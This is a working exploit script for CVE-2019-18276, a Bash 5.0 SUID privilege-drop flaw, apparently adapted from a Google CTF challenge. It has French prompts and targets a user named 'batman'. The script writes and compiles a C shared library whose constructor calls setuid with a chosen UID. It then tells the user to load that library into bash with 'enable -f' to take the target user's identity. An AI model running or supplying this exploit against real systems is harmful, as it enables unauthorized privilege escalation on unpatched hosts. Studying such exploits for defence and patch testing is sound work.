# Exploit Title : Bash 5.0 - SUID Priv Drop Exploit
# Date : 2021-12-06
# Original Author: Ian Pudney , Chet Ramey
# Version : Bash 5.0.3(1)
# Tested on Linux
# Credit : Ian Pudney from Google Security and Privacy Team based on Google CTF suidbash
# CVE : 2019-18276
# CVE Link : https://nvd.nist.gov/vuln/detail/CVE-2019-18276

#!/usr/bin/env bash
#Terminal Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'


echo -e "L'UID de ${GREEN}'batman'${NC} est:${GREEN} \n"
id -u batman
echo -e "${NC}"
read -p "Saisisser l'UID de: 'batman' : " euid


#Create a C file and output the exploit code
echo '' > pwn.c
cat <<EOT >> pwn.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

void __attribute((constructor)) initLibrary(void) {
        printf("Escape lib is initialized\n");
        printf("[LO] uid:%d | euid:%d\n", getuid(), geteuid());
        setuid($euid);
        printf("[LO] uid:%d | euid:%d\n\n\n", getuid(), geteuid());
}
EOT

echo -e  "${RED}"
echo -e "Exploit Code copied to pwn.c ! \n"
sleep 2
echo -e "Compiling Exploit Object ! \n"
$(which gcc ) -c -fPIC pwn.c -o pwn.o
sleep 2
echo -e "Compiling Exploit Shared Object ! \n"
$(which gcc ) -shared -fPIC pwn.o -o libpwn.so
sleep 2
echo -e "Exploit Compiled ! \n"
sleep 2
echo -e "${NC}------------------------------------- \n"

echo -e "${BLUE}Dernière étape: Tapez la commande suivante:${NC} enable -f ./libpwn.so asd"
